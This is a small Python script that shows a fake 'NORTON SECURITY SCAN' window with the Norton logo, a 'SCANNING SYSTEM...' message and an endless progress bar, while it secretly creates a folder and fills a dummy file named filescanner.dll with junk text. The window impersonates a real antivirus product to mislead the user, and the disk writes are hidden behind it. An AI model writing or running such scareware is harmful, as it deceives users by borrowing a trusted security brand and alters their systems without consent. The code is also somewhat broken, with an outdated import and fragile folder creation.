import tkinter as tk
import threading
from time import sleep
import os
from PIL import ImageTk, Image
import ttk

class App(threading.Thread):

	def __init__(self):
		threading.Thread.__init__(self)
		self.start()

	def callback(self):
		self.root.quit()
	
	def run(self):
		self.root = tk.Tk()
		self.root.protocol("WM_DELETE_WINDOW", self.callback)
		self.root.wm_title("NORTON SECURITY SCAN")
		img = ImageTk.PhotoImage(Image.open("Norton.png"))
		panel = tk.Label(self.root, image = img)
		panel.pack(side = "top", fill = "both", expand = "yes")
		T = tk.Text(self.root, height=2, width=70)
		T.pack()
		T.insert("1.0", "SCANNING SYSTEM...\n")
		pb = ttk.Progressbar(self.root, orient="horizontal", length=1000, mode="determinate")
		pb.pack(side="bottom")
		pb.start()
		self.root.mainloop()
		
app = App()

if os.path.exists("C:/FileScanner/Important") == False:
	os.mkdir("C:/FileScanner")
	os.chdir("C:/FileScanner")
	os.mkdir("C:/FileScanner/Important")

for i in range(30):
	myfile = open("C:/FileScanner/Important/filescanner.dll", "a")
	sleep(2)
	for j in range(30000):
		myfile.write("appended text")
	myfile.close()





